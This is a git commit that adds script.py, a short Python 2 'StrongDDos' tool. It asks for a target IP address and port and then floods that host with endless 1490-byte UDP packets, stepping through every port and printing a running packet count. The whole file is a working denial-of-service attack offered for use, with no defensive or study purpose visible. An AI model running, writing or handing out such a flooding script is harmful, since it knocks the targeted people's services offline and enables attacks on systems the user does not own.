1f1e2213967ee07c0c0c604be079704c04c0dc04
Ty Ridsdill <147262313+CanadianNetwork2030@users.noreply.github.com>
2023-10-09 02:38:12 -0400

    script.py

---
+++ script.py
@@ -0,0 +1,27 @@
+import sys, os, time, socket, random
+from datetime import datetime
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+os.system("figlet StrongDDos")
+print("---------------------")
+print ("| Author: Ty Ridsdill |")
+print("---------------------")
+print
+ip = raw_input("IP Adress : ")
+port = input("Port : ")
+os.system("clear")
+os.system("figlet Attack Starting")
+time.sleep(0.1)
+sent = 0
+try:
+    while True:
+         sock.sendto(bytes, (ip,port))
+         sent = sent + 1
+         port = port + 1
+         print ("Sended %s packets to %s to port:%s"%(sent,ip,port))
+         if port == 65534:
+           port = 1
+except KeyboardInterrupt:
+    os.system("figlet DDos Attack Stoped !")
+    exit()
